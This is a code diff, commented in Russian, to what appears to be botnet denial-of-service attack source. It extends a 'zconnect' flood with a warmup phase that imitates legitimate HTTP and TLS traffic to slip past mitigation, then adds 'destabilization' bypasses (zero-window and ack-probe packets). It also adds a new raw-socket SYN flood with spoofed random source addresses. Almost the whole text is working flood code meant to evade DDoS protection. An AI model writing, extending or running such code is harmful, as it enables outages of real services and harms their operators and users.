@@ -710,19 +710,30 @@ void attack_zconnect(uint8_t targs_len, struct attack_target *targs, uint8_t opt
     }
 
     time_t start_time = time(NULL);
-    int phase = 0; // 0 = легитимный трафик, 1 = агрессивный обход
+    // фазы: 0 прогрев 5-10с, 1 плато, 2 дестабилизация
+    int warmup_secs = 5 + (rand_next() % 6);
+    int plateau_secs = (duration > warmup_secs + 5) ? (duration * 4 / 10) : 5;
+    if (warmup_secs + plateau_secs > duration) plateau_secs = (duration > warmup_secs) ? (duration - warmup_secs) : 0;
+    int phase = 0;
 
     while (TRUE)
     {
         time_t current_time = time(NULL);
         int elapsed = current_time - start_time;
         
-        // переключение фаз: первые 10 секунд легитимный трафик
-        if (elapsed > 10 && phase == 0)
+        // переключение фаз
+        if (elapsed >= warmup_secs && phase == 0)
         {
             phase = 1;
 #ifdef DEBUG
-            printf("[zconnect] switching to aggressive bypass mode\n");
+            printf("[zconnect] phase -> plateau\n");
+#endif
+        }
+        else if (elapsed >= warmup_secs + plateau_secs && phase == 1)
+        {
+            phase = 2;
+#ifdef DEBUG
+            printf("[zconnect] phase -> destabilization\n");
 #endif
         }
 
@@ -748,8 +759,7 @@ void attack_zconnect(uint8_t targs_len, struct attack_target *targs, uint8_t opt
 
                 if (phase == 0)
                 {
-                    // фаза 1: легитимный трафик (2-3 мбита)
-                    // медленные, правильные tcp handshake
+                    // фаза 0: прогрев, малый битрейт, корректный handshake
                     iph->version = 4;
                     iph->ihl = 5;
                     iph->tos = ip_tos;
@@ -782,12 +792,111 @@ void attack_zconnect(uint8_t targs_len, struct attack_target *targs, uint8_t opt
 
                     targs[i].sock_addr.sin_port = htons(dst_port);
                     sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
+                    // имитация установления окна, небольшой ack
+                    tcph->syn = 0; tcph->ack = 1; tcph->seq = htonl(seq + 1); tcph->ack_seq = htonl(rand_next());
+                    tcph->check = 0; tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
+                    sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
 
-                    usleep(10000); // медленная отправка для легитимности
+                    usleep(15000);
+                }
+                else if (phase == 1)
+                {
+                    // фаза 1: плато, легитимные данные с низкой энтропией
+                    int payload_size = data_len;
+                    if (payload_size > 1200) payload_size = 1200;
+
+                    iph->version = 4; iph->ihl = 5; iph->tos = ip_tos;
+                    iph->id = htons(rand_next() & 0xffff);
+                    iph->frag_off = htons(0x4000);
+                    iph->ttl = ip_ttl; iph->protocol = IPPROTO_TCP; iph->saddr = LOCAL_ADDR; iph->daddr = target_ip;
+
+                    tcph->source = htons(src_port);
+                    tcph->dest = htons(dst_port);
+                    tcph->seq = htonl(seq + 1);
+                    tcph->ack = 1; tcph->psh = 1; tcph->doff = 5;
+                    tcph->window = htons(65535);
+
+                    if (dst_port == 80 || dst_port == 8080)
+                    {
+                        char *http_req = "GET / HTTP/1.1\r\nHost: target\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n";
+                        int http_len = util_strlen(http_req);
+                        if (http_len > payload_size) http_len = payload_size;
+                        util_memcpy(data, http_req, http_len);
+                        payload_size = http_len;
+                    }
+                    else if (dst_port == 443 || dst_port == 8443)
+                    {
+                        // ja3-like tls clienthello (упрощенный, валидный по формату и порядку ext)
+                        // record header
+                        int o = 0;
+                        data[o++] = 0x16; // handshake
+                        data[o++] = 0x03; data[o++] = 0x03; // tls1.2
+                        int recLenPos = o; o += 2; // placeholder
+                        // handshake clienthello
+                        data[o++] = 0x01; // client_hello
+                        int hsLenPos = o; o += 3;
+                        data[o++] = 0x03; data[o++] = 0x03; // client_version
+                        for (int k = 0; k < 32; k++) data[o++] = rand_next() & 0xff; // random
+                        data[o++] = 0x00; // session id len
+                        // cipher suites
+                        uint16_t ciphers[] = {0xC02F,0xC02B,0xC030,0xC02C,0xCCA8,0xCCA9,0xC02F,0x009E,0x009F,0x0035};
+                        int csLenPos = o; o += 2; int csStart = o;
+                        for (unsigned ci = 0; ci < sizeof(ciphers)/2; ci++) { data[o++] = (ciphers[ci] >> 8) & 0xff; data[o++] = ciphers[ci] & 0xff; }
+                        uint16_t csLen = (uint16_t)(o - csStart); data[csLenPos] = (csLen >> 8) & 0xff; data[csLenPos+1] = csLen & 0xff;
+                        data[o++] = 0x01; data[o++] = 0x00; // compression methods: null
+                        // extensions
+                        int extLenPos = o; o += 2; int extStart = o;
+                        // server_name
+                        data[o++] = 0x00; data[o++] = 0x00; // type
+                        int snLenPos = o; o += 2; int snStart = o;
+                        data[o++] = 0x00; data[o++] = 0x00; // list len placeholder
+                        data[o++] = 0x00; // name type host_name
+                        int sniLenPos = o; o += 2; int hostLen = 6; // "target"
+                        char host[] = "target";
+                        for (int k = 0; k < hostLen; k++) data[o++] = host[k];
+                        int sniLen = hostLen; data[sniLenPos] = (sniLen >> 8) & 0xff; data[sniLenPos+1] = sniLen & 0xff;
+                        int listLen = 3 + hostLen; data[snStart] = (listLen >> 8) & 0xff; data[snStart+1] = listLen & 0xff;
+                        int snTot = o - snStart; data[snLenPos] = (snTot >> 8) & 0xff; data[snLenPos+1] = snTot & 0xff;
+                        // supported_groups
+                        data[o++] = 0x00; data[o++] = 0x0a; int sgLenPos = o; o += 2; int sgListPos = o; o += 2; uint16_t groups[] = {0x001d,0x0017,0x0018,0x0019};
+                        for (unsigned gi = 0; gi < sizeof(groups)/2; gi++) { data[o++] = (groups[gi]>>8)&0xff; data[o++] = groups[gi]&0xff; }
+                        uint16_t sgListLen = (uint16_t)(o - sgListPos - 2); data[sgListPos] = (sgListLen >> 8)&0xff; data[sgListPos+1] = sgListLen & 0xff;
+                        uint16_t sgLen = sgListLen + 2; data[sgLenPos] = (sgLen>>8)&0xff; data[sgLenPos+1] = sgLen & 0xff;
+                        // ec_point_formats
+                        data[o++] = 0x00; data[o++] = 0x0b; data[o++] = 0x00; data[o++] = 0x02; data[o++] = 0x01; data[o++] = 0x00;
+                        // signature_algorithms
+                        data[o++] = 0x00; data[o++] = 0x0d; int saLenPos = o; o += 2; int saListPos = o; o += 2; uint16_t sigs[] = {0x0403,0x0503,0x0603,0x0203,0x0201};
+                        for (unsigned si = 0; si < sizeof(sigs)/2; si++) { data[o++] = (sigs[si]>>8)&0xff; data[o++] = sigs[si]&0xff; }
+                        uint16_t saListLen = (uint16_t)(o - saListPos - 2); data[saListPos] = (saListLen>>8)&0xff; data[saListPos+1] = saListLen & 0xff;
+                        uint16_t saLen = saListLen + 2; data[saLenPos] = (saLen>>8)&0xff; data[saLenPos+1] = saLen & 0xff;
+                        // alpn
+                        data[o++] = 0x00; data[o++] = 0x10; data[o++] = 0x00; data[o++] = 0x0b; data[o++] = 0x00; data[o++] = 0x09; data[o++] = 0x08;
+                        char alpn[] = "http/1.1"; for (int k = 0; k < 8; k++) data[o++] = alpn[k];
+                        // finish ext lengths
+                        uint16_t extLen = (uint16_t)(o - extStart); data[extLenPos] = (extLen>>8)&0xff; data[extLenPos+1] = extLen & 0xff;
+                        // finish hs len
+                        int hsLen = o - (hsLenPos + 3); data[hsLenPos] = (hsLen>>16)&0xff; data[hsLenPos+1] = (hsLen>>8)&0xff; data[hsLenPos+2] = hsLen & 0xff;
+                        // finish record len
+                        uint16_t recLen = (uint16_t)(o - 5); data[recLenPos] = (recLen>>8)&0xff; data[recLenPos+1] = recLen & 0xff;
+                        payload_size = o;
+                    }
+                    else
+                    {
+                        for (int k = 0; k < payload_size; k++) data[k] = (k % 94) + 33;
+                    }
+
+                    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_size);
+                    iph->check = 0; tcph->check = 0;
+                    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
+                    tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + payload_size), sizeof(struct tcphdr) + payload_size);
+                    targs[i].sock_addr.sin_port = htons(dst_port);
+                    sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_size, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
+
+                    usleep(3000);
                 }
                 else
                 {
-                    // фаза 2: агрессивные обходы
+                    // фаза 2: дестабилизация и обходы
                     // техники из orbitv3 + новые обходы
                     
                     // обход 1: tcp options flood
@@ -905,6 +1014,31 @@ void attack_zconnect(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                     sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
 
                     usleep(200);
+
+                    // обход 4: zero-window и ack-probe
+                    // zero-window advertise
+                    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
+                    tcph->psh = 0; tcph->syn = 0; tcph->ack = 1; tcph->fin = 0; tcph->rst = 0;
+                    tcph->window = htons(0);
+                    tcph->seq = htonl(seq + 2);
+                    tcph->ack_seq = htonl(rand_next());
+                    iph->check = 0; tcph->check = 0;
+                    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
+                    tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
+                    sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
+
+                    usleep(1500);
+
+                    // ack-probe: маленькие psh-ack с окном > 0
+                    int probe_len = 1 + (rand_next() % 3);
+                    for (int k = 0; k < probe_len; k++) data[k] = 0x41 + (rand_next() % 26);
+                    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + probe_len);
+                    tcph->window = htons(64);
+                    tcph->psh = 1; tcph->ack = 1;
+                    iph->check = 0; tcph->check = 0;
+                    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
+                    tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + probe_len), sizeof(struct tcphdr) + probe_len);
+                    sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + probe_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
                 }
             }
         }
@@ -913,6 +1047,106 @@ void attack_zconnect(uint8_t targs_len, struct attack_target *targs, uint8_t opt
             break;
 
         usleep(phase == 0 ? 10000 : 1000); // разные задержки для фаз
+    }
+
+    close(rfd);
+}
+
+void attack_spoofed(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
+{
+    int i, rfd;
+    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
+    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
+    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
+    int threads = attack_get_opt_int(opts_len, opts, ATK_OPT_THREADS, 32);
+    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 0);
+
+    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
+        return;
+
+    i = 1;
+    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
+    {
+        close(rfd);
+        return;
+    }
+
+    while (TRUE)
+    {
+        for (i = 0; i < targs_len; i++)
+        {
+            int t;
+            for (t = 0; t < threads; t++)
+            {
+                char packet[2048];
+                struct iphdr *iph = (struct iphdr *)packet;
+                struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
+                uint8_t *opts_ptr = (uint8_t *)(tcph + 1);
+                char *data = (char *)(opts_ptr + 20);
+
+                ipv4_t target_ip;
+                if (targs[i].netmask < 32)
+                    target_ip = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
+                else
+                    target_ip = targs[i].addr;
+
+                // spoofed source ip
+                ipv4_t src_ip = rand_next();
+                port_t src_port = (rand_next() % 60000) + 1024;
+                uint32_t seq = rand_next();
+
+                // ip header
+                iph->version = 4;
+                iph->ihl = 5;
+                iph->tos = ip_tos;
+                iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + 20 + data_len);
+                iph->id = htons(rand_next() & 0xffff);
+                iph->frag_off = htons(0x4000);
+                iph->ttl = ip_ttl;
+                iph->protocol = IPPROTO_TCP;
+                iph->check = 0;
+                iph->saddr = src_ip;
+                iph->daddr = target_ip;
+
+                // tcp header with options like orbitv3
+                tcph->source = htons(src_port);
+                tcph->dest = htons((dport == 0xffff) ? ((rand_next() % 60000) + 1024) : dport);
+                tcph->seq = htonl(seq);
+                tcph->ack_seq = 0;
+                tcph->doff = 10; // 40 bytes options
+                tcph->syn = 1;
+                tcph->ack = 0;
+                tcph->psh = 0;
+                tcph->rst = 0;
+                tcph->fin = 0;
+                tcph->urg = 0;
+                tcph->window = htons(65535);
+                tcph->check = 0;
+                tcph->urg_ptr = 0;
+
+                // tcp options: MSS, SACK, TS, WScale
+                *opts_ptr++ = 2; *opts_ptr++ = 4; *((uint16_t *)opts_ptr) = htons(1400 + (rand_next() & 0x0f)); opts_ptr += 2;
+                *opts_ptr++ = 4; *opts_ptr++ = 2;
+                *opts_ptr++ = 8; *opts_ptr++ = 10; *((uint32_t *)opts_ptr) = rand_next(); opts_ptr += 4; *((uint32_t *)opts_ptr) = 0; opts_ptr += 4;
+                *opts_ptr++ = 1; *opts_ptr++ = 3; *opts_ptr++ = 3; *opts_ptr++ = 6;
+
+                // optional small data after syn for some dst ports
+                int payload = 0;
+                if (data_len > 0)
+                {
+                    payload = (data_len > 512) ? 512 : data_len;
+                    for (int k = 0; k < payload; k++) data[k] = (k % 94) + 33;
+                }
+
+                iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + 40 + payload);
+                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
+                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + 40 + payload), sizeof(struct tcphdr) + 40 + payload);
+
+                targs[i].sock_addr.sin_port = tcph->dest;
+                sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + 40 + payload, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
+            }
+        }
+        usleep(100);
     }
 
     close(rfd);
